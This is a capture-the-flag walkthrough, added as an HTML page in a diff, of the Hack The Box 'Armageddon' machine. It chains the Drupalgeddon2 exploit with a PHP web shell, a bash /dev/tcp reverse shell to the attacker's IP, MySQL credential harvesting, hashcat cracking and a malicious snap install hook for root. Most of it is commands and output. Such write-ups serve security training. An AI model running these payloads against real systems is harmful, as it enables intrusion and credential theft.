@@ -1,0 +1,190 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Armageddon Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Armageddon Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="apache">Shell - apache</a></li>
+        <li><a href="#brucetherealadmin">Shell - brucetherealadmin</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Armageddon starts off by exploiting the drupal web server.  The exploit name is in the name of the box.  After gaining the apache shell, mysql creds can be found in a web server config file.  Credentials for brucetherealadmin are gained from mysql.  As brucetherealadmin we have a sudo ability to install snap packges.  We install a malicious snap package and gain root.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 30 09:46:05 2021 as: nmap -p- -oN ping_tcp 10.129.48.89&#13;&#10;Nmap scan report for 10.129.48.89&#13;&#10;Host is up (0.041s latency).&#13;&#10;Not shown: 65533 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Thu Sep 30 09:46:29 2021 -- 1 IP address (1 host up) scanned in 24.49 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 30 09:46:50 2021 as: nmap -p22,80 -sV -sC -oN script_tcp 10.129.48.89&#13;&#10;Nmap scan report for 10.129.48.89&#13;&#10;Host is up (0.040s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)&#13;&#10;|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)&#13;&#10;|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)&#13;&#10;80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)&#13;&#10;|_http-generator: Drupal 7 (http://drupal.org)&#13;&#10;| http-robots.txt: 36 disallowed entries (15 shown)&#13;&#10;| /includes/ /misc/ /modules/ /profiles/ /scripts/ &#13;&#10;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt &#13;&#10;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt &#13;&#10;|_/LICENSE.txt /MAINTAINERS.txt&#13;&#10;|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16&#13;&#10;|_http-title: Welcome to  Armageddon |  Armageddon&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Thu Sep 30 09:47:07 2021 -- 1 IP address (1 host up) scanned in 16.24 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I begin with taking a look at the website.  In my nmap scans I see /robots.txt exists.  So I immediately look for interesting directories or files listed there.</li>
+
+    <pre>
+# Directories&#13;&#10;Disallow: /includes/&#13;&#10;Disallow: /misc/&#13;&#10;Disallow: /modules/&#13;&#10;Disallow: /profiles/&#13;&#10;Disallow: /scripts/&#13;&#10;Disallow: /themes/&#13;&#10;# Files&#13;&#10;Disallow: /CHANGELOG.txt&#13;&#10;Disallow: /cron.php&#13;&#10;Disallow: /INSTALL.mysql.txt&#13;&#10;Disallow: /INSTALL.pgsql.txt&#13;&#10;Disallow: /INSTALL.sqlite.txt&#13;&#10;Disallow: /install.php&#13;&#10;Disallow: /INSTALL.txt&#13;&#10;Disallow: /LICENSE.txt&#13;&#10;Disallow: /MAINTAINERS.txt&#13;&#10;Disallow: /update.php&#13;&#10;Disallow: /UPGRADE.txt&#13;&#10;Disallow: /xmlrpc.php
+    </pre>
+
+    <li>Changelog's are interesting because we can see what program is running and the version number.  By going to http://10.129.48.89/CHANGELOG.txt I find out that drupal 7.57 is running.</li>
+
+    <pre>
+Drupal 7.56, 2017-06-21&#13;&#10;-----------------------&#13;&#10;- Fixed security issues (access bypass). See SA-CORE-2017-003.
+    </pre>
+
+    <h2><a id="apache">Shell - apache</a></h2>
+
+    <li>Now that I know the program and version number I can search for exploits.  I choose to use searchsploit.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon/nmap]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit drupal 7.5&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Drupal 7.0 &lt; 7.31 - &apos;Drupalgeddon&apos; SQL Injection (Add Admin User)                  | php/webapps/34992.py&#13;&#10;Drupal 7.0 &lt; 7.31 - &apos;Drupalgeddon&apos; SQL Injection (Admin Session)                   | php/webapps/44355.php&#13;&#10;Drupal 7.0 &lt; 7.31 - &apos;Drupalgeddon&apos; SQL Injection (PoC) (Reset Password) (1)        | php/webapps/34984.py&#13;&#10;Drupal 7.0 &lt; 7.31 - &apos;Drupalgeddon&apos; SQL Injection (PoC) (Reset Password) (2)        | php/webapps/34993.php&#13;&#10;Drupal 7.0 &lt; 7.31 - &apos;Drupalgeddon&apos; SQL Injection (Remote Code Execution)           | php/webapps/35150.php&#13;&#10;Drupal &lt; 7.34 - Denial of Service                                                  | php/dos/35415.txt&#13;&#10;Drupal &lt; 7.58 - &apos;Drupalgeddon3&apos; (Authenticated) Remote Code (Metasploit)           | php/webapps/44557.rb&#13;&#10;Drupal &lt; 7.58 - &apos;Drupalgeddon3&apos; (Authenticated) Remote Code Execution (PoC)        | php/webapps/44542.txt&#13;&#10;Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &apos;Drupalgeddon2&apos; Remote Code Executio | php/webapps/44449.rb&#13;&#10;Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &apos;Drupalgeddon2&apos; Remote Code Executio | php/webapps/44449.rb&#13;&#10;Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &apos;Drupalgeddon2&apos; Remote Code Execution (Metasp | php/remote/44482.rb&#13;&#10;Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &apos;Drupalgeddon2&apos; Remote Code Execution (PoC)   | php/webapps/44448.py&#13;&#10;Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Exe | php/remote/46510.rb&#13;&#10;Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                     | php/webapps/46452.txt&#13;&#10;Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                 | php/webapps/46459.py&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
+
+    <li>I decide to use php/webapps/44449.rb</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon/nmap]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit -m 44449                                                                                      130 &Cross;&#13;&#10;  Exploit: Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &apos;Drupalgeddon2&apos; Remote Code Execution&#13;&#10;      URL: https://www.exploit-db.com/exploits/44449&#13;&#10;     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb&#13;&#10;File Type: Ruby script, ASCII text&#13;&#10;&#13;&#10;Copied to: /home/kali/Documents/htb/Armageddon/nmap/44449.rb
+    </pre>
+
+    <il>I easily get a shell based on a web shell.</il>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ ruby 44449.rb http://10.129.48.89&#13;&#10;[*] --==[::#Drupalggedon2::]==--&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[i] Target : http://10.129.48.89/&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[+] Found  : http://10.129.48.89/CHANGELOG.txt    (HTTP Response: 200)&#13;&#10;[+] Drupal!: v7.56&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[*] Testing: Form   (user/password)&#13;&#10;[+] Result : Form valid&#13;&#10;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &#13;&#10;[*] Testing: Clean URLs&#13;&#10;[!] Result : Clean URLs disabled (HTTP Response: 404)&#13;&#10;[i] Isn&apos;t an issue for Drupal v7.x&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[*] Testing: Code Execution   (Method: name)&#13;&#10;[i] Payload: echo DGAJYSXB&#13;&#10;[+] Result : DGAJYSXB&#13;&#10;[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[*] Testing: Existing file   (http://10.129.48.89/shell.php)&#13;&#10;[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***&#13;&#10;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &#13;&#10;[*] Testing: Writing To Web Root   (./)&#13;&#10;[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php&#13;&#10;[+] Result : &lt;?php if( isset( $_REQUEST[&apos;c&apos;] ) ) { system( $_REQUEST[&apos;c&apos;] . &apos; 2&gt;&amp;1&apos; ); }&#13;&#10;[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!&#13;&#10;--------------------------------------------------------------------------------&#13;&#10;[i] Fake PHP shell:   curl &apos;http://10.129.48.89/shell.php&apos; -d &apos;c=hostname&apos;&#13;&#10;armageddon.htb&gt;&gt; id&#13;&#10;uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0&#13;&#10;armageddon.htb&gt;&gt; 
+    </pre>
+
+    <li>In order to get a full reverse shell, I decide to create a rev.php file on the web server.  This will make it easy to create another reverse shell if ever needed.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ cat rev.php        &#13;&#10;&lt;?php system(&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.30/4444 0&gt;&amp;1&apos;&quot;) ?&gt;&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ sudo python3 -m http.server 80                       &#13;&#10;Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+    </pre>
+
+    <pre>
+armageddon.htb&gt;&gt; pwd&#13;&#10;/var/www/html&#13;&#10;armageddon.htb&gt;&gt; curl http://10.10.14.30/rev.php -o rev.php&#13;&#10;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&#13;&#10;                                 Dload  Upload   Total   Spent    Left  Speed&#13;&#10;100    71  100    71    0     0    785      0 --:--:-- --:--:-- --:--:--   788
+    </pre>
+
+    <li>Now I can easily create reverse shells by visiting http://10.129.48.89/rev.php</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ curl http://10.129.48.89/rev.php  
+    </pre>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 4444&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.129.48.89.&#13;&#10;Ncat: Connection from 10.129.48.89:45890.&#13;&#10;bash: no job control in this shell&#13;&#10;bash-4.2$ id&#13;&#10;id&#13;&#10;uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0&#13;&#10;bash-4.2$ 
+    </pre>
+
+    <li>I attempt to get a pty terminal but it will not let me.</li>
+
+    <pre>
+bash-4.2$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;Traceback (most recent call last):&#13;&#10;  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;&#13;&#10;  File &quot;/usr/lib64/python3.6/pty.py&quot;, line 154, in spawn&#13;&#10;    pid, master_fd = fork()&#13;&#10;  File &quot;/usr/lib64/python3.6/pty.py&quot;, line 96, in fork&#13;&#10;    master_fd, slave_fd = openpty()&#13;&#10;  File &quot;/usr/lib64/python3.6/pty.py&quot;, line 29, in openpty&#13;&#10;    master_fd, slave_name = _open_terminal()&#13;&#10;  File &quot;/usr/lib64/python3.6/pty.py&quot;, line 59, in _open_terminal&#13;&#10;    raise OSError(&apos;out of pty devices&apos;)&#13;&#10;OSError: out of pty devices
+    </pre>
+
+    <li>I search for "password" in /var/www/html (which is where our reverse shell immediately lands us)</li>
+
+    <pre>
+bash-4.2$ grep -irn password&#13;&#10;grep -irn password&#13;&#10;CHANGELOG.txt:87:- Fixed that following a password reset link while logged in leaves users unable&#13;&#10;CHANGELOG.txt:88:  to change their password (minor user interface change:&#13;&#10;CHANGELOG.txt:322:  elements, such as textfields, textareas, and password fields (API change:&#13;&#10;CHANGELOG.txt:571:- Changed the password reset form to pre-fill the username when requested via a&#13;&#10;CHANGELOG.txt:745:- Introduced a &apos;user_password_reset_timeout&apos; variable to allow the 24-hour&#13;&#10;CHANGELOG.txt:746:  expiration for user password reset links to be adjusted (API addition).&#13;&#10;CHANGELOG.txt:914:- Fixed usability bug with first password field being pre-filled by certain&#13;&#10;CHANGELOG.txt:971:- More secure password generation.&#13;&#10;CHANGELOG.txt:1032:    * Implemented a pluggable password system and much stronger password hashes&#13;&#10;CHANGELOG.txt:1033:      that are compatible with the Portable PHP password hashing framework.&#13;&#10;CHANGELOG.txt:1034:    * Rate limited login attempts to prevent brute-force password guessing, and&#13;&#10;CHANGELOG.txt:1063:    * Redesigned password strength validator.&#13;&#10;CHANGELOG.txt:1304:  Password leakage in URL), see SA-CORE-2009-007.&#13;&#10;CHANGELOG.txt:1437:    * Dynamically check password strength and confirmation.&#13;&#10;CHANGELOG.txt:1517:- Fixed security issues (Cross site scripting and Password leakage in URL), see&#13;&#10;CHANGELOG.txt:1766:    * Reworked the &apos;request new password&apos; functionality.&#13;&#10;includes/ajax.inc:713:      case &apos;password&apos;:&#13;&#10;includes/authorize.inc:38:      &apos;#markup&apos; =&gt; t(&apos;WARNING: You are not using an encrypted connection, so your password will be sent in plain text. &lt;a href=&quot;@https-link&quot;&gt;Learn more&lt;/a&gt;.&apos;, array(&apos;@https-link&apos; =&gt; &apos;http://drupal.org/https-information&apos;)),&#13;&#10;includes/authorize.inc:247:          // We do *not* want to store passwords in the database, unless the&#13;&#10;includes/authorize.inc:252:            if ($form[&apos;connection_settings&apos;][$filetransfer_backend][$key][&apos;#type&apos;] != &apos;password&apos;) {&#13;&#10;includes/authorize.inc:263:        // Save the connection settings minus the password.&#13;&#10;includes/common.inc:847:    // Add in username and password to Proxy-Authorization header if needed.&#13;&#10;includes/common.inc:849:      $proxy_password = variable_get(&apos;proxy_password&apos;, &apos;&apos;);&#13;&#10;includes/common.inc:850:      $options[&apos;headers&apos;][&apos;Proxy-Authorization&apos;] = &apos;Basic &apos; . base64_encode($proxy_username . (!empty($proxy_password) ? &quot;:&quot; . $proxy_password : &apos;&apos;));&#13;&#10;includes/common.inc:1253:        (?:(?:[\w\.\-\+!$&amp;&apos;\(\)*\+,;=]|%[0-9a-f]{2})+:)*      # a username or a username and password&#13;&#10;                                    (Lines Removed)&#13;&#10;sites/default/settings.php:70: *   &apos;password&apos; =&gt; &apos;password&apos;,&#13;&#10;sites/default/settings.php:84: * username, password, host, and database name.&#13;&#10;sites/default/settings.php:122: *   &apos;password&apos; =&gt; &apos;password&apos;,&#13;&#10;sites/default/settings.php:137: *   &apos;password&apos; =&gt; &apos;password&apos;,&#13;&#10;sites/default/settings.php:229: *     &apos;password&apos; =&gt; &apos;password&apos;,&#13;&#10;sites/default/settings.php:237: *     &apos;password&apos; =&gt; &apos;password&apos;,&#13;&#10;<mark>sites/default/settings.php:254:      &apos;password&apos; =&gt; &apos;CQHEy@9M*m23gBVj&apos;,</mark>
+sites/default/settings.php:579: * by using the username and password variables. The proxy_user_agent variable&#13;&#10;sites/default/settings.php:588:# $conf[&apos;proxy_password&apos;] = &apos;&apos;;&#13;&#10;themes/bartik/css/ie.css:5:#password-strength-text {&#13;&#10;themes/bartik/css/style-rtl.css:135:/* -------------- Password Meter  ------------- */&#13;&#10;themes/bartik/css/style-rtl.css:137:#password-strength {&#13;&#10;themes/bartik/css/style-rtl.css:142:#password-strength-text {&#13;&#10;themes/bartik/css/style-rtl.css:221:.password-suggestions ul li {&#13;&#10;themes/bartik/css/style.css:1062:/* -------------- Password Meter  ------------- */&#13;&#10;themes/bartik/css/style.css:1065:.password-parent {&#13;&#10;themes/bartik/css/style.css:1068:.password-parent,&#13;&#10;themes/bartik/css/style.css:1069:div.form-item div.password-suggestions {&#13;&#10;themes/bartik/css/style.css:1072:.password-strength-text,&#13;&#10;themes/bartik/css/style.css:1073:.password-strength-title,&#13;&#10;themes/bartik/css/style.css:1074:div.password-confirm {&#13;&#10;themes/bartik/css/style.css:1077:.password-strength-text {&#13;&#10;themes/bartik/css/style.css:1080:div.password-confirm {&#13;&#10;themes/bartik/css/style.css:1242:.password-suggestions ul li {&#13;&#10;themes/bartik/css/style.css:1415:div.password-suggestions {
+    </pre>
+
+    <h2><a id=brucetherealadmin>Shell - brucetherealadmin</a></h2>
+
+    <li>There is a good amount of output so I scan through it using shift + PgUp/PgDn.  We find a password in sites/default/settings.php.  So I take a closer look at that file.</li>
+
+    <pre>
+cat sites/default/settings.php | grep CQHEy@ -A 5 -B 5&#13;&#10;  array (&#13;&#10;    &apos;default&apos; =&gt; &#13;&#10;    array (&#13;&#10;      &apos;database&apos; =&gt; &apos;drupal&apos;,&#13;&#10;      &apos;username&apos; =&gt; &apos;drupaluser&apos;,&#13;&#10;      &apos;password&apos; =&gt; &apos;CQHEy@9M*m23gBVj&apos;,&#13;&#10;      &apos;host&apos; =&gt; &apos;localhost&apos;,&#13;&#10;      &apos;port&apos; =&gt; &apos;&apos;,&#13;&#10;      &apos;driver&apos; =&gt; &apos;mysql&apos;,&#13;&#10;      &apos;prefix&apos; =&gt; &apos;&apos;,&#13;&#10;    ),
+    </pre>
+
+    <li>I grep for part of the password and use the -A and -B flags in order to see 5 lines before and after where the password shows up in the document.  This turns out to be mysql credentials with the username drupaluser.  We are unable to login to the mysql databases because we do not have a pty terminal.  So we are forced to pass commands to the mysql database.</li>
+
+    <pre>
+<mark>bash-4.2$ mysql -e &apos;show databases;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos;</mark>&#13;&#10;mysql -e &apos;show databases;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos;&#13;&#10;Database&#13;&#10;information_schema&#13;&#10;drupal&#13;&#10;mysql&#13;&#10;performance_schema
+<mark>bash-4.2$ mysql -e &apos;show tables;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos; drupal</mark>&#13;&#10;mysql -e &apos;show tables;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos; drupal&#13;&#10;Tables_in_drupal&#13;&#10;actions&#13;&#10;authmap&#13;&#10;batch&#13;&#10;block&#13;&#10;block_custom&#13;&#10;block_node_type&#13;&#10;block_role&#13;&#10;blocked_ips&#13;&#10;cache&#13;&#10;cache_block&#13;&#10;cache_bootstrap&#13;&#10;cache_field&#13;&#10;cache_filter&#13;&#10;cache_form&#13;&#10;cache_image&#13;&#10;cache_menu&#13;&#10;cache_page&#13;&#10;cache_path&#13;&#10;comment&#13;&#10;date_format_locale&#13;&#10;date_format_type&#13;&#10;date_formats&#13;&#10;field_config&#13;&#10;field_config_instance&#13;&#10;field_data_body&#13;&#10;field_data_comment_body&#13;&#10;field_data_field_image&#13;&#10;field_data_field_tags&#13;&#10;field_revision_body&#13;&#10;field_revision_comment_body&#13;&#10;field_revision_field_image&#13;&#10;field_revision_field_tags&#13;&#10;file_managed&#13;&#10;file_usage&#13;&#10;filter&#13;&#10;filter_format&#13;&#10;flood&#13;&#10;history&#13;&#10;image_effects&#13;&#10;image_styles&#13;&#10;menu_custom&#13;&#10;menu_links&#13;&#10;menu_router&#13;&#10;node&#13;&#10;node_access&#13;&#10;node_comment_statistics&#13;&#10;node_revision&#13;&#10;node_type&#13;&#10;queue&#13;&#10;rdf_mapping&#13;&#10;registry&#13;&#10;registry_file&#13;&#10;role&#13;&#10;role_permission&#13;&#10;search_dataset&#13;&#10;search_index&#13;&#10;search_node_links&#13;&#10;search_total&#13;&#10;semaphore&#13;&#10;sequences&#13;&#10;sessions&#13;&#10;shortcut_set&#13;&#10;shortcut_set_users&#13;&#10;system&#13;&#10;taxonomy_index&#13;&#10;taxonomy_term_data&#13;&#10;taxonomy_term_hierarchy&#13;&#10;taxonomy_vocabulary&#13;&#10;url_alias&#13;&#10;users&#13;&#10;users_roles&#13;&#10;variable&#13;&#10;watchdog&#13;&#10;<mark>bash-4.2$ mysql -e &apos;select * from users;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos; drupal</mark>&#13;&#10;&lt;* from users;&apos; -u drupaluser -p&apos;CQHEy@9M*m23gBVj&apos; drupal                    &#13;&#10;uid&#9;name&#9;pass&#9;mail&#9;theme&#9;signature&#9;signature_format&#9;created&#9;access&#9;login&#9;status&#9;timezone&#9;language&#9;picture&#9;init&#9;data&#13;&#10;0&#9;&#9;&#9;&#9;&#9;&#9;NULL&#9;0&#9;0&#9;0&#9;0&#9;NULL&#9;&#9;0&#9;&#9;NULL&#13;&#10;1&#9;brucetherealadmin&#9;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#9;admin@armageddon.eu&#9;&#9;filtered_html&#9;1606998756&#9;1607077194&#9;1607076276&#9;1&#9;Europe/London&#9;&#9;0&#9;admin@armageddon.eu&#9;a:1:{s:7:&quot;overlay&quot;;i:1;}&#13;&#10;3&#9;asd&#9;$S$D40oou5E4SEXknHp0Y1I.tA/sc1Bm4VxDF7BzUiv40UF2XwFYmfg&#9;asd@asd.com&#9;&#9;&#9;filtered_html1633012858&#9;0&#9;0&#9;0&#9;Europe/London&#9;&#9;0&#9;asd@asd.com&#9;NULL&#13;&#10;bash-4.2$ 
+    </pre>
+
+    <li>From the database I get the password hash $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt for the user brucetherealadmin.  I crack this has using hashcat.</li>
+
+    <pre>
+.\hashcat.exe -a 0 -m 7900 hashes.txt rockyou.txt&#13;&#10;&#13;&#10;hashcat (v6.2.3) starting&#13;&#10;&#13;&#10;Successfully initialized NVIDIA CUDA library.&#13;&#10;&#13;&#10;Failed to initialize NVIDIA RTC library.&#13;&#10;&#13;&#10;* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.&#13;&#10;             CUDA SDK Toolkit required for proper device support and utilization.&#13;&#10;             Falling back to OpenCL runtime.&#13;&#10;&#13;&#10;* Device #1: WARNING! Kernel exec timeout is not disabled.&#13;&#10;             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.&#13;&#10;             To disable the timeout, see: https://hashcat.net/q/timeoutpatch&#13;&#10;OpenCL API (OpenCL 1.2 CUDA 11.1.96) - Platform #1 [NVIDIA Corporation]&#13;&#10;=======================================================================&#13;&#10;* Device #1: GeForce RTX 3090, 22912/24576 MB (6144 MB allocatable), 82MCU&#13;&#10;&#13;&#10;Minimum password length supported by kernel: 0&#13;&#10;Maximum password length supported by kernel: 256&#13;&#10;&#13;&#10;Hashes: 1 digests; 1 unique digests, 1 unique salts&#13;&#10;Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates&#13;&#10;Rules: 1&#13;&#10;&#13;&#10;Optimizers applied:&#13;&#10;* Zero-Byte&#13;&#10;* Single-Hash&#13;&#10;* Single-Salt&#13;&#10;* Uses-64-Bit&#13;&#10;* (null)&#13;&#10;&#13;&#10;Watchdog: Temperature abort trigger set to 90c&#13;&#10;&#13;&#10;Host memory required for this attack: 1102 MB&#13;&#10;&#13;&#10;Dictionary cache hit:&#13;&#10;* Filename..: rockyou.txt&#13;&#10;* Passwords.: 14344385&#13;&#10;* Bytes.....: 139921529&#13;&#10;* Keyspace..: 14344385&#13;&#10;&#13;&#10;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo&#13;&#10;&#13;&#10;Session..........: hashcat&#13;&#10;Status...........: Cracked&#13;&#10;Hash.Name........: Drupal7&#13;&#10;Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#13;&#10;Time.Started.....: Thu Sep 30 10:57:54 2021 (4 secs)&#13;&#10;Time.Estimated...: Thu Sep 30 10:57:58 2021 (0 secs)&#13;&#10;Kernel.Feature...: Pure Kernel&#13;&#10;Guess.Base.......: File (rockyou.txt)&#13;&#10;Guess.Queue......: 1/1 (100.00%)&#13;&#10;Speed.#1.........:    78215 H/s (8.35ms) @ Accel:4 Loops:64 Thr:1024 Vec:1&#13;&#10;Recovered........: 1/1 (100.00%) Digests&#13;&#10;Progress.........: 335872/14344385 (2.34%)&#13;&#10;Rejected.........: 0/335872 (0.00%)&#13;&#10;Restore.Point....: 0/14344385 (0.00%)&#13;&#10;Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32704-32768&#13;&#10;Candidate.Engine.: Device Generator&#13;&#10;Candidates.#1....: PencilKeyboardScanner123 -&gt; sacro&#13;&#10;Hardware.Mon.#1..: Temp: 53c Fan: 30% Util: 99% Core:1830MHz Mem:9501MHz Bus:16&#13;&#10;&#13;&#10;Started: Thu Sep 30 10:57:42 2021&#13;&#10;Stopped: Thu Sep 30 10:57:59 2021
+    </pre>
+
+    <li>The password for brucetherealadmin turns out to be booboo.  I attempt to SSH in as brucetherealadmin and it works.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Armageddon]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p booboo ssh brucetherealadmin@10.129.48.89       &#13;&#10;Last login: Thu Sep 30 16:59:11 2021 from 10.10.14.30&#13;&#10;[brucetherealadmin@armageddon ~]$ 
+    </pre>
+
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>After gaining access as brucetherealadmin, I check sudo -l for sudo abilities.</li>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ sudo -l&#13;&#10;Matching Defaults entries for brucetherealadmin on armageddon:&#13;&#10;    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY&#13;&#10;    HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,&#13;&#10;    env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC&#13;&#10;    LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,&#13;&#10;    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin&#13;&#10;&#13;&#10;User brucetherealadmin may run the following commands on armageddon:&#13;&#10;    (root) NOPASSWD: /usr/bin/snap install *
+    </pre>
+
+    <li>We have sudo permissions to snap install *, so I check the website GTFOBins to see how we can exploit this ability.</li>
+
+    <pre>
+COMMAND=id&#13;&#10;cd $(mktemp -d)&#13;&#10;mkdir -p meta/hooks&#13;&#10;printf &apos;#!/bin/sh\n%s; false&apos; &quot;$COMMAND&quot; &gt;meta/hooks/install&#13;&#10;chmod +x meta/hooks/install&#13;&#10;fpm -n xxxx -s dir -t snap -a all meta&#13;&#10;&#13;&#10;sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+    </pre>
+
+    <li>It appears all we need to do is create a malicious snap file and then install it.  In order to do this, I installed fpm on my Kali machine in order to create the malicious snap file.  Then I transferred this file to the victim using curl.</li>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ curl http://10.10.14.30/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
+    </pre>
+
